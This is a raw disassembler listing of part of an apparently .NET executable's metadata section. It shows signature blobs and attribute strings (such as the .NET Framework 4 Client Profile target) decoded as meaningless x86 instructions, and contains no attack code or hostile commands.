  40c48f:	00 08                	add    %cl,(%eax)
  40c491:	05 28 01 12 20       	add    $0x20120128,%eax
  40c496:	08 03                	or     %al,(%ebx)
  40c498:	28 00                	sub    %al,(%eax)
  40c49a:	08 03                	or     %al,(%ebx)
  40c49c:	06                   	push   %es
  40c49d:	11 24 03             	adc    %esp,(%ebx,%eax,1)
  40c4a0:	06                   	push   %es
  40c4a1:	12 1c 04             	adc    (%esp,%eax,1),%bl
  40c4a4:	20 01                	and    %al,(%ecx)
  40c4a6:	01 0e                	add    %ecx,(%esi)
  40c4a8:	04 20                	add    $0x20,%al
  40c4aa:	01 08                	add    %ecx,(%eax)
  40c4ac:	0e                   	push   %cs
  40c4ad:	05 20 01 01 12       	add    $0x12010120,%eax
  40c4b2:	39 04 20             	cmp    %eax,(%eax,%eiz,1)
  40c4b5:	01 01                	add    %eax,(%ecx)
  40c4b7:	0a 04 20             	or     (%eax,%eiz,1),%al
  40c4ba:	01 01                	add    %eax,(%ecx)
  40c4bc:	0b 03                	or     (%ebx),%eax
  40c4be:	20 00                	and    %al,(%eax)
  40c4c0:	0b 03                	or     (%ebx),%eax
  40c4c2:	20 00                	and    %al,(%eax)
  40c4c4:	0a 03                	or     (%ebx),%al
  40c4c6:	20 00                	and    %al,(%eax)
  40c4c8:	0d 05 20 01 01       	or     $0x1012005,%eax
  40c4cd:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c4d2:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c4d7:	01 0e                	add    %ecx,(%esi)
  40c4d9:	0e                   	push   %cs
  40c4da:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c4df:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c4e2:	01 02                	add    %eax,(%edx)
  40c4e4:	0e                   	push   %cs
  40c4e5:	03 20                	add    (%eax),%esp
  40c4e7:	00 0e                	add    %cl,(%esi)
  40c4e9:	04 20                	add    $0x20,%al
  40c4eb:	01 01                	add    %eax,(%ecx)
  40c4ed:	02 04 20             	add    (%eax,%eiz,1),%al
  40c4f0:	01 01                	add    %eax,(%ecx)
  40c4f2:	0c 04                	or     $0x4,%al
  40c4f4:	20 01                	and    %al,(%ecx)
  40c4f6:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c4fc:	1c 04                	sbb    $0x4,%al
  40c4fe:	20 00                	and    %al,(%eax)
  40c500:	11 24 04             	adc    %esp,(%esp,%eax,1)
  40c503:	20 00                	and    %al,(%eax)
  40c505:	12 2d 03 28 00 0e    	adc    0xe002803,%ch
  40c50b:	03 28                	add    (%eax),%ebp
  40c50d:	00 0a                	add    %cl,(%edx)
  40c50f:	03 28                	add    (%eax),%ebp
  40c511:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c517:	1c 04                	sbb    $0x4,%al
  40c519:	28 00                	sub    %al,(%eax)
  40c51b:	11 24 04             	adc    %esp,(%esp,%eax,1)
  40c51e:	00 00                	add    %al,(%eax)
  40c520:	00 00                	add    %al,(%eax)
  40c522:	04 01                	add    $0x1,%al
  40c524:	00 00                	add    %al,(%eax)
  40c526:	00 04 02             	add    %al,(%edx,%eax,1)
  40c529:	00 00                	add    %al,(%eax)
  40c52b:	00 04 03             	add    %al,(%ebx,%eax,1)
  40c52e:	00 00                	add    %al,(%eax)
  40c530:	00 04 04             	add    %al,(%esp,%eax,1)
  40c533:	00 00                	add    %al,(%eax)
  40c535:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40c53c:	06                   	push   %es
  40c53d:	00 00                	add    %al,(%eax)
  40c53f:	00 04 07             	add    %al,(%edi,%eax,1)
  40c542:	00 00                	add    %al,(%eax)
  40c544:	00 04 08             	add    %al,(%eax,%ecx,1)
  40c547:	00 00                	add    %al,(%eax)
  40c549:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40c54c:	00 00                	add    %al,(%eax)
  40c54e:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c551:	00 00                	add    %al,(%eax)
  40c553:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40c556:	00 00                	add    %al,(%eax)
  40c558:	00 06                	add    %al,(%esi)
  40c55a:	00 02                	add    %al,(%edx)
  40c55c:	0e                   	push   %cs
  40c55d:	12 39                	adc    (%ecx),%bh
  40c55f:	08 05 00 01 0e 12    	or     %al,0x120e0100
  40c565:	39 06                	cmp    %eax,(%esi)
  40c567:	00 02                	add    %al,(%edx)
  40c569:	0e                   	push   %cs
  40c56a:	05 12 39 05 00       	add    $0x53912,%eax
  40c56f:	01 01                	add    %eax,(%ecx)
  40c571:	12 39                	adc    (%ecx),%bh
  40c573:	06                   	push   %es
  40c574:	00 02                	add    %al,(%edx)
  40c576:	01 12                	add    %edx,(%edx)
  40c578:	39 0e                	cmp    %ecx,(%esi)
  40c57a:	07                   	pop    %es
  40c57b:	00 02                	add    %al,(%edx)
  40c57d:	01 12                	add    %edx,(%edx)
  40c57f:	39 1d 05 06 00 02    	cmp    %ebx,0x2000605
  40c585:	01 12                	add    %edx,(%edx)
  40c587:	39 0d 06 00 02 01    	cmp    %ecx,0x1020006
  40c58d:	12 39                	adc    (%ecx),%bh
  40c58f:	0c 06                	or     $0x6,%al
  40c591:	00 02                	add    %al,(%edx)
  40c593:	01 12                	add    %edx,(%edx)
  40c595:	39 02                	cmp    %eax,(%edx)
  40c597:	06                   	push   %es
  40c598:	00 02                	add    %al,(%edx)
  40c59a:	01 12                	add    %edx,(%edx)
  40c59c:	39 0b                	cmp    %ecx,(%ebx)
  40c59e:	06                   	push   %es
  40c59f:	00 02                	add    %al,(%edx)
  40c5a1:	01 12                	add    %edx,(%edx)
  40c5a3:	39 0a                	cmp    %ecx,(%edx)
  40c5a5:	04 00                	add    $0x0,%al
  40c5a7:	01 18                	add    %ebx,(%eax)
  40c5a9:	0e                   	push   %cs
  40c5aa:	06                   	push   %es
  40c5ab:	00 02                	add    %al,(%edx)
  40c5ad:	02 18                	add    (%eax),%bl
  40c5af:	10 02                	adc    %al,(%edx)
  40c5b1:	05 20 01 0e 12       	add    $0x120e0120,%eax
  40c5b6:	41                   	inc    %ecx
  40c5b7:	03 00                	add    (%eax),%eax
  40c5b9:	00 0e                	add    %cl,(%esi)
  40c5bb:	04 00                	add    $0x0,%al
  40c5bd:	01 0e                	add    %ecx,(%esi)
  40c5bf:	0e                   	push   %cs
  40c5c0:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40c5c6:	d5 0a                	aad    $0xa
  40c5c8:	3a 06                	cmp    (%esi),%al
  40c5ca:	00 01                	add    %al,(%ecx)
  40c5cc:	12 45 12             	adc    0x12(%ebp),%al
  40c5cf:	49                   	dec    %ecx
  40c5d0:	06                   	push   %es
  40c5d1:	00 01                	add    %al,(%ecx)
  40c5d3:	11 48 11             	adc    %ecx,0x11(%eax)
  40c5d6:	48                   	dec    %eax
  40c5d7:	02 06                	add    (%esi),%al
  40c5d9:	09 03                	or     %eax,(%ebx)
  40c5db:	06                   	push   %es
  40c5dc:	11 48 04             	adc    %ecx,0x4(%eax)
  40c5df:	00 00                	add    %al,(%eax)
  40c5e1:	00 80 03 06 12 4d    	add    %al,0x4d120603(%eax)
  40c5e7:	06                   	push   %es
  40c5e8:	00 02                	add    %al,(%edx)
  40c5ea:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c5ed:	51                   	push   %ecx
  40c5ee:	06                   	push   %es
  40c5ef:	00 03                	add    %al,(%ebx)
  40c5f1:	01 09                	add    %ecx,(%ecx)
  40c5f3:	09 09                	or     %ecx,(%ecx)
  40c5f5:	05 00 02 02 0e       	add    $0xe020200,%eax
  40c5fa:	0e                   	push   %cs
  40c5fb:	05 00 01 01 12       	add    $0x12010100,%eax
  40c600:	20 04 00             	and    %al,(%eax,%eax,1)
  40c603:	01 01                	add    %eax,(%ecx)
  40c605:	0e                   	push   %cs
  40c606:	18 06                	sbb    %al,(%esi)
  40c608:	15 12 55 01 15       	adc    $0x15015512,%eax
  40c60d:	12 59 0a             	adc    0xa(%ecx),%bl
  40c610:	12 5d 1c             	adc    0x1c(%ebp),%bl
  40c613:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40c619:	05 12 4d 0e 0e       	add    $0xe0e4d12,%eax
  40c61e:	0e                   	push   %cs
  40c61f:	04 20                	add    $0x20,%al
  40c621:	00 00                	add    %al,(%eax)
  40c623:	00 04 40             	add    %al,(%eax,%eax,2)
  40c626:	00 00                	add    %al,(%eax)
  40c628:	00 04 10             	add    %al,(%eax,%edx,1)
  40c62b:	00 00                	add    %al,(%eax)
  40c62d:	00 04 20             	add    %al,(%eax,%eiz,1)
  40c630:	01 0e                	add    %ecx,(%esi)
  40c632:	0e                   	push   %cs
  40c633:	06                   	push   %es
  40c634:	20 01                	and    %al,(%ecx)
  40c636:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40c63b:	20 02                	and    %al,(%edx)
  40c63d:	02 1d 05 1d 05 03    	add    0x3051d05,%bl
  40c643:	06                   	push   %es
  40c644:	11 74 03 06          	adc    %esi,0x6(%ebx,%eax,1)
  40c648:	11 70 04             	adc    %esi,0x4(%eax)
  40c64b:	20 01                	and    %al,(%ecx)
  40c64d:	01 08                	add    %ecx,(%eax)
  40c64f:	08 01                	or     %al,(%ecx)
  40c651:	00 08                	add    %cl,(%eax)
  40c653:	00 00                	add    %al,(%eax)
  40c655:	00 00                	add    %al,(%eax)
  40c657:	00 1e                	add    %bl,(%esi)
  40c659:	01 00                	add    %eax,(%eax)
  40c65b:	01 00                	add    %eax,(%eax)
  40c65d:	54                   	push   %esp
  40c65e:	02 16                	add    (%esi),%dl
  40c660:	57                   	push   %edi
  40c661:	72 61                	jb     0x40c6c4
  40c663:	70 4e                	jo     0x40c6b3
  40c665:	6f                   	outsl  %ds:(%esi),(%dx)
  40c666:	6e                   	outsb  %ds:(%esi),(%dx)
  40c667:	45                   	inc    %ebp
  40c668:	78 63                	js     0x40c6cd
  40c66a:	65 70 74             	gs jo  0x40c6e1
  40c66d:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40c674:	77 73                	ja     0x40c6e9
  40c676:	01 05 20 01 01 11    	add    %eax,0x11010120
  40c67c:	71 08                	jno    0x40c686
  40c67e:	01 00                	add    %eax,(%eax)
  40c680:	02 00                	add    (%eax),%al
  40c682:	00 00                	add    %al,(%eax)
  40c684:	00 00                	add    %al,(%eax)
  40c686:	05 01 00 00 00       	add    $0x1,%eax
  40c68b:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40c68e:	00 07                	add    %al,(%edi)
  40c690:	31 2e                	xor    %ebp,(%esi)
  40c692:	30 2e                	xor    %ch,(%esi)
  40c694:	30 2e                	xor    %ch,(%esi)
  40c696:	30 00                	xor    %al,(%eax)
  40c698:	00 65 01             	add    %ah,0x1(%ebp)
  40c69b:	00 29                	add    %ch,(%ecx)
  40c69d:	2e 4e                	cs dec %esi
  40c69f:	45                   	inc    %ebp
  40c6a0:	54                   	push   %esp
  40c6a1:	46                   	inc    %esi
  40c6a2:	72 61                	jb     0x40c705
  40c6a4:	6d                   	insl   (%dx),%es:(%edi)
  40c6a5:	65 77 6f             	gs ja  0x40c717
  40c6a8:	72 6b                	jb     0x40c715
  40c6aa:	2c 56                	sub    $0x56,%al
  40c6ac:	65 72 73             	gs jb  0x40c722
  40c6af:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40c6b6:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40c6b9:	72 6f                	jb     0x40c72a
  40c6bb:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40c6c2:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40c6c9:	0e                   	push   %cs
  40c6ca:	14 46                	adc    $0x46,%al
  40c6cc:	72 61                	jb     0x40c72f
  40c6ce:	6d                   	insl   (%dx),%es:(%edi)
  40c6cf:	65 77 6f             	gs ja  0x40c741
  40c6d2:	72 6b                	jb     0x40c73f
  40c6d4:	44                   	inc    %esp
  40c6d5:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40c6dc:	61                   	popa
  40c6dd:	6d                   	insl   (%dx),%es:(%edi)
  40c6de:	65 1f                	gs pop %ds
  40c6e0:	2e 4e                	cs dec %esi
  40c6e2:	45                   	inc    %ebp
  40c6e3:	54                   	push   %esp
  40c6e4:	20 46 72             	and    %al,0x72(%esi)
  40c6e7:	61                   	popa
  40c6e8:	6d                   	insl   (%dx),%es:(%edi)
  40c6e9:	65 77 6f             	gs ja  0x40c75b
  40c6ec:	72 6b                	jb     0x40c759
  40c6ee:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40c6f1:	43                   	inc    %ebx
  40c6f2:	6c                   	insb   (%dx),%es:(%edi)
  40c6f3:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40c6fa:	6f                   	outsl  %ds:(%esi),(%dx)
  40c6fb:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40c702:	04 49                	add    $0x49,%al
  40c704:	74 65                	je     0x40c76b
  40c706:	6d                   	insl   (%dx),%es:(%edi)
  40c707:	00 00                	add    %al,(%eax)
  40c709:	03 07                	add    (%edi),%eax
  40c70b:	01 08                	add    %ecx,(%eax)
  40c70d:	04 00                	add    $0x0,%al
  40c70f:	01 08                	add    %ecx,(%eax)
  40c711:	0e                   	push   %cs
  40c712:	05 20 02 08 08       	add    $0x8080220,%eax
  40c717:	08 03                	or     %al,(%ebx)
  40c719:	07                   	pop    %es
  40c71a:	01 02                	add    %eax,(%edx)
  40c71c:	05 00 00 12 80       	add    $0x80120000,%eax
  40c721:	b5 05                	mov    $0x5,%ch
  40c723:	20 01                	and    %al,(%ecx)
  40c725:	0e                   	push   %cs
  40c726:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40c72b:	12 80 b9 05 20 00    	adc    0x2005b9(%eax),%al
  40c731:	12 80 bd 05 20 01    	adc    0x12005bd(%eax),%al
  40c737:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40c73c:	03 02                	add    (%edx),%eax
  40c73e:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40c743:	14 07                	adc    $0x7,%al
  40c745:	08 0e                	or     %cl,(%esi)
  40c747:	08 1d 12 80 cd 08    	or     %bl,0x8cd8012
  40c74d:	12 80 cd 12 80 d1    	adc    -0x2e7fed33(%eax),%al
  40c753:	12 80 d5 1d 0e 0c    	adc    0xc0e1dd5(%eax),%al
  40c759:	20 03                	and    %al,(%ebx)
  40c75b:	01 11                	add    %edx,(%ecx)
  40c75d:	80 d9 11             	sbb    $0x11,%cl
  40c760:	80 dd 11             	sbb    $0x11,%ch
  40c763:	80 e1 06             	and    $0x6,%cl
  40c766:	20 01                	and    %al,(%ecx)
  40c768:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40c76d:	20 01                	and    %al,(%ecx)
  40c76f:	08 08                	or     %cl,(%eax)
  40c771:	07                   	pop    %es
  40c772:	00 01                	add    %al,(%ecx)
  40c774:	1d 12 80 cd 0e       	sbb    $0xecd8012,%eax
  40c779:	07                   	pop    %es
  40c77a:	20 02                	and    %al,(%edx)
  40c77c:	01 12                	add    %edx,(%edx)
  40c77e:	80 cd 08             	or     $0x8,%ch
  40c781:	06                   	push   %es
  40c782:	20 01                	and    %al,(%ecx)
  40c784:	01 12                	add    %edx,(%edx)
  40c786:	80 f1 09             	xor    $0x9,%cl
  40c789:	20 02                	and    %al,(%edx)
  40c78b:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40c790:	80 f5 06             	xor    $0x6,%ch
  40c793:	20 02                	and    %al,(%edx)
  40c795:	01 12                	add    %edx,(%edx)
  40c797:	0d 02 05 20 02       	or     $0x2200502,%eax
  40c79c:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40c79f:	09 20                	or     %esp,(%eax)
  40c7a1:	03 01                	add    (%ecx),%eax
  40c7a3:	12 39                	adc    (%ecx),%bh
  40c7a5:	02 12                	add    (%edx),%dl
  40c7a7:	81 01 05 20 00 12    	addl   $0x12002005,(%ecx)
  40c7ad:	81 05 0b 20 04 01 0e 	addl   $0x981120e,0x104200b
  40c7b4:	12 81 09 
  40c7b7:	11 81 0d 02 09 20    	adc    %eax,0x2009020d(%ecx)
  40c7bd:	04 01                	add    $0x1,%al
  40c7bf:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40c7c5:	0c 20                	or     $0x20,%al
  40c7c7:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40c7cc:	08 08                	or     %cl,(%eax)
  40c7ce:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40c7d4:	01 11                	add    %edx,(%ecx)
  40c7d6:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40c7dc:	02 12                	add    (%edx),%dl
  40c7de:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40c7e1:	02 08                	add    (%eax),%cl
  40c7e3:	08 05 20 01 08 12    	or     %al,0x12080120
  40c7e9:	25 06 00 02 08       	and    $0x8020006,%eax
  40c7ee:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40c7f3:	03 08                	add    (%eax),%ecx
  40c7f5:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40c7fa:	20 01                	and    %al,(%ecx)
  40c7fc:	01 12                	add    %edx,(%edx)
  40c7fe:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40c804:	1c 0c                	sbb    $0xc,%al
  40c806:	07                   	pop    %es
  40c807:	06                   	push   %es
  40c808:	1c 02                	sbb    $0x2,%al
  40c80a:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40c80f:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40c815:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40c818:	02 07                	add    (%edi),%al
  40c81a:	20 02                	and    %al,(%edx)
  40c81c:	02 08                	add    (%eax),%cl
  40c81e:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40c824:	01 1d 05 08 08 05    	add    %ebx,0x5080805
  40c82a:	00 02                	add    %al,(%edx)
  40c82c:	0e                   	push   %cs
  40c82d:	0e                   	push   %cs
  40c82e:	0e                   	push   %cs
  40c82f:	09 07                	or     %eax,(%edi)
  40c831:	04 12                	add    $0x12,%al
  40c833:	81 3d 1d 05 08 05 05 	cmpl   $0xe020005,0x508051d
  40c83a:	00 02 0e 
  40c83d:	0e                   	push   %cs
  40c83e:	1c 06                	sbb    $0x6,%al
  40c840:	20 01                	and    %al,(%ecx)
  40c842:	12 81 3d 0e 06 07    	adc    0x7060e3d(%ecx),%al
  40c848:	03 1d 05 08 08 06    	add    0x6080805,%ebx
  40c84e:	15 12 31 01 12       	adc    $0x12013112,%eax
  40c853:	20 05 20 01 13 00    	and    %al,0x130120
  40c859:	08 04 07             	or     %al,(%edi,%eax,1)
  40c85c:	01 12                	add    %edx,(%edx)
  40c85e:	20 05 20 01 01 13    	and    %al,0x13010120
  40c864:	00 0e                	add    %cl,(%esi)
  40c866:	07                   	pop    %es
  40c867:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40c86c:	11 81 41 01 12 20    	adc    %eax,0x20120141(%ecx)
  40c872:	12 20                	adc    (%eax),%ah
  40c874:	09 20                	or     %esp,(%eax)
  40c876:	00 15 11 81 41 01    	add    %dl,0x1418111
  40c87c:	13 00                	adc    (%eax),%eax
  40c87e:	07                   	pop    %es
  40c87f:	15 11 81 41 01       	adc    $0x1418111,%eax
  40c884:	12 20                	adc    (%eax),%ah
  40c886:	04 20                	add    $0x20,%al
  40c888:	00 13                	add    %dl,(%ebx)
  40c88a:	00 07                	add    %al,(%edi)
  40c88c:	07                   	pop    %es
  40c88d:	04 05                	add    $0x5,%al
  40c88f:	1d 05 08 08 04       	sbb    $0x4080805,%eax
  40c894:	20 01                	and    %al,(%ecx)
  40c896:	01 05 04 07 01 11    	add    %eax,0x11010704
  40c89c:	24 04                	and    $0x4,%al
  40c89e:	00 01                	add    %al,(%ecx)
  40c8a0:	0b 0a                	or     (%edx),%ecx
  40c8a2:	04 00                	add    $0x0,%al
  40c8a4:	01 0b                	add    %ecx,(%ebx)
  40c8a6:	0e                   	push   %cs
  40c8a7:	04 00                	add    $0x0,%al
  40c8a9:	01 0b                	add    %ecx,(%ebx)
  40c8ab:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40c8b0:	0c 06                	or     $0x6,%al
  40c8b2:	00 01                	add    %al,(%ecx)
  40c8b4:	0b 11                	or     (%ecx),%edx
  40c8b6:	81 55 04 00 01 0a 0a 	adcl   $0xa0a0100,0x4(%ebp)
  40c8bd:	04 00                	add    $0x0,%al
  40c8bf:	01 0a                	add    %ecx,(%edx)
  40c8c1:	0e                   	push   %cs
  40c8c2:	04 00                	add    $0x0,%al
  40c8c4:	01 0a                	add    %ecx,(%edx)
  40c8c6:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40c8cb:	0c 06                	or     $0x6,%al
  40c8cd:	00 01                	add    %al,(%ecx)
  40c8cf:	0a 11                	or     (%ecx),%dl
  40c8d1:	81 55 04 00 01 0d 0a 	adcl   $0xa0d0100,0x4(%ebp)
  40c8d8:	04 00                	add    $0x0,%al
  40c8da:	01 0d 0e 07 07 02    	add    %ecx,0x207070e
  40c8e0:	11 24 11             	adc    %esp,(%ecx,%edx,1)
  40c8e3:	81 55 05 00 01 1d 05 	adcl   $0x51d0100,0x5(%ebp)
  40c8ea:	0c 02                	or     $0x2,%al
  40c8ec:	1d 05 07 07 02       	sbb    $0x2070705,%eax
  40c8f1:	1d 05 12 81 59       	sbb    $0x59811205,%eax
  40c8f6:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40c8fb:	11 81 61 11 81 65    	adc    %eax,0x65811161(%ecx)
  40c901:	11 81 69 07 20 02    	adc    %eax,0x2200769(%ecx)
  40c907:	01 0e                	add    %ecx,(%esi)
  40c909:	11 81 61 0b 07 06    	adc    %eax,0x6070b61(%ecx)
  40c90f:	12 20                	adc    (%eax),%ah
  40c911:	12 20                	adc    (%eax),%ah
  40c913:	1d 0e 0e 08 08       	sbb    $0x8080e0e,%eax
  40c918:	09 00                	or     %eax,(%eax)
  40c91a:	02 01                	add    (%ecx),%al
  40c91c:	12 81 71 11 81 75    	adc    0x75811171(%ecx),%al
  40c922:	05 07 01 12 81       	add    $0x81120107,%eax
  40c927:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40c92c:	81 59 06 00 02 07 1d 	sbbl   $0x1d070200,0x6(%ecx)
  40c933:	05 08 06 00 02       	add    $0x2000608,%eax
  40c938:	0c 1d                	or     $0x1d,%al
  40c93a:	05 08 06 00 02       	add    $0x2000608,%eax
  40c93f:	0d 1d 05 08 06       	or     $0x608051d,%eax
  40c944:	00 02                	add    %al,(%edx)
  40c946:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40c94c:	02 0b                	add    (%ebx),%cl
  40c94e:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c953:	02 06                	add    (%esi),%al
  40c955:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c95a:	02 0a                	add    (%edx),%cl
  40c95c:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40c961:	03 12                	add    (%edx),%edx
  40c963:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40c96a:	07 02 12 
  40c96d:	20 02                	and    %al,(%edx)
  40c96f:	04 07                	add    $0x7,%al
  40c971:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40c977:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40c97c:	04 1d                	add    $0x1d,%al
  40c97e:	05 1d 05 08 05       	add    $0x508051d,%eax
  40c983:	06                   	push   %es
  40c984:	07                   	pop    %es
  40c985:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40c98b:	00 01                	add    %al,(%ecx)
  40c98d:	1d 05 0b 1c 07       	sbb    $0x71c0b05,%eax
  40c992:	0c 12                	or     $0x12,%al
  40c994:	81 7d 1d 05 1d 05 0e 	cmpl   $0xe051d05,0x1d(%ebp)
  40c99b:	08 1d 12 41 08 12    	or     %bl,0x12084112
  40c9a1:	41                   	inc    %ecx
  40c9a2:	12 41 12             	adc    0x12(%ecx),%al
  40c9a5:	81 81 12 81 85 12 81 	addl   $0x48981,0x12858112(%ecx)
  40c9ac:	89 04 00 
  40c9af:	00 12                	add    %dl,(%edx)
  40c9b1:	41                   	inc    %ecx
  40c9b2:	05 20 00 12 81       	add    $0x81120020,%eax
  40c9b7:	91                   	xchg   %eax,%ecx
  40c9b8:	05 00 00 1d 12       	add    $0x121d0000,%eax
  40c9bd:	41                   	inc    %ecx
  40c9be:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c9c3:	0e                   	push   %cs
  40c9c4:	06                   	push   %es
  40c9c5:	20 01                	and    %al,(%ecx)
  40c9c7:	01 11                	add    %edx,(%ecx)
  40c9c9:	81 99 06 20 01 01 12 	sbbl   $0x4818112,0x1012006(%ecx)
  40c9d0:	81 81 04 
  40c9d3:	06                   	push   %es
  40c9d4:	12 81 85 09 20 02    	adc    0x2200985(%ecx),%al
  40c9da:	12 81 85 0e 11 81    	adc    -0x7eeef17b(%ecx),%al
  40c9e0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c9e1:	06                   	push   %es
  40c9e2:	00 03                	add    %al,(%ebx)
  40c9e4:	0e                   	push   %cs
  40c9e5:	0e                   	push   %cs
  40c9e6:	0e                   	push   %cs
  40c9e7:	0e                   	push   %cs
  40c9e8:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c9ed:	1c 07                	sbb    $0x7,%al
  40c9ef:	00 01                	add    %al,(%ecx)
  40c9f1:	12 41 12             	adc    0x12(%ecx),%al
  40c9f4:	81 81 04 07 02 0a 02 	addl   $0x6071002,0xa020704(%ecx)
  40c9fb:	10 07 06 
  40c9fe:	12 81 b5 12 81 b9    	adc    -0x467eed4b(%ecx),%al
  40ca04:	12 81 bd 12 81 c1    	adc    -0x3e7eed43(%ecx),%al
  40ca0a:	0e                   	push   %cs
  40ca0b:	02 05 20 00 12 81    	add    0x81120020,%al
  40ca11:	b9 05 20 00 12       	mov    $0x12002005,%ecx
  40ca16:	81 bd 05 20 00 12 81 	cmpl   $0x2004c181,0x12002005(%ebp)
  40ca1d:	c1 04 20 
  40ca20:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40ca23:	04 07                	add    $0x7,%al
  40ca25:	02 02                	add    (%edx),%al
  40ca27:	02 03                	add    (%ebx),%al
  40ca29:	20 00                	and    %al,(%eax)
  40ca2b:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40ca2e:	02 18                	add    (%eax),%bl
  40ca30:	02 09                	add    (%ecx),%cl
  40ca32:	07                   	pop    %es
  40ca33:	04 1d                	add    $0x1d,%al
  40ca35:	12 41 08             	adc    0x8(%ecx),%al
  40ca38:	12 41 0e             	adc    0xe(%ecx),%al
  40ca3b:	0a 07                	or     (%edi),%al
  40ca3d:	04 12                	add    $0x12,%al
  40ca3f:	81 b5 08 12 81 b9 0e 	xorl   $0x1100c0e,-0x467eedf8(%ebp)
  40ca46:	0c 10 01 
  40ca49:	01 15 12 81 d1 01    	add    %edx,0x1d18112
  40ca4f:	1e                   	push   %ds
  40ca50:	00 12                	add    %dl,(%edx)
  40ca52:	35 05 0a 01 12       	xor    $0x12010a05,%eax
  40ca57:	81 c1 0c 10 01 01    	add    $0x101100c,%ecx
  40ca5d:	1e                   	push   %ds
  40ca5e:	00 15 12 81 d1 01    	add    %dl,0x1d18112
  40ca64:	1e                   	push   %ds
  40ca65:	00 03                	add    %al,(%ebx)
  40ca67:	07                   	pop    %es
  40ca68:	01 0e                	add    %ecx,(%esi)
  40ca6a:	05 00 00 12 81       	add    $0x81120000,%eax
  40ca6f:	d5 05                	aad    $0x5
  40ca71:	00 01                	add    %al,(%ecx)
  40ca73:	0e                   	push   %cs
  40ca74:	1d 1c 0b 07 05       	sbb    $0x5070b1c,%eax
  40ca79:	1d 05 12 81 3d       	sbb    $0x3d811205,%eax
  40ca7e:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40ca83:	20 02                	and    %al,(%edx)
  40ca85:	0e                   	push   %cs
  40ca86:	08 08                	or     %cl,(%eax)
  40ca88:	06                   	push   %es
  40ca89:	07                   	pop    %es
  40ca8a:	02 02                	add    (%edx),%al
  40ca8c:	11 81 55 05 20 02    	adc    %eax,0x2200555(%ecx)
  40ca92:	0e                   	push   %cs
  40ca93:	0e                   	push   %cs
  40ca94:	0e                   	push   %cs
  40ca95:	05 20 00 11 81       	add    $0x81110020,%eax
  40ca9a:	55                   	push   %ebp
  40ca9b:	05 00 00 12 81       	add    $0x81120000,%eax
  40caa0:	e5 06                	in     $0x6,%eax
  40caa2:	20 01                	and    %al,(%ecx)
  40caa4:	01 12                	add    %edx,(%edx)
  40caa6:	81 e5 06 20 01 02    	and    $0x2012006,%ebp
  40caac:	11 81 ed 11 07 05    	adc    %eax,0x50711ed(%ecx)
  40cab2:	12 81 b5 15 12 31    	adc    0x311215b5(%ecx),%al
  40cab8:	01 0e                	add    %ecx,(%esi)
  40caba:	12 81 bd 12 81 c1    	adc    -0x3e7eed43(%ecx),%al
  40cac0:	0e                   	push   %cs
  40cac1:	05 15 12 31 01       	add    $0x1311215,%eax
  40cac6:	0e                   	push   %cs
  40cac7:	05 20 00 1d 13       	add    $0x131d0020,%eax
  40cacc:	00 06                	add    %al,(%esi)
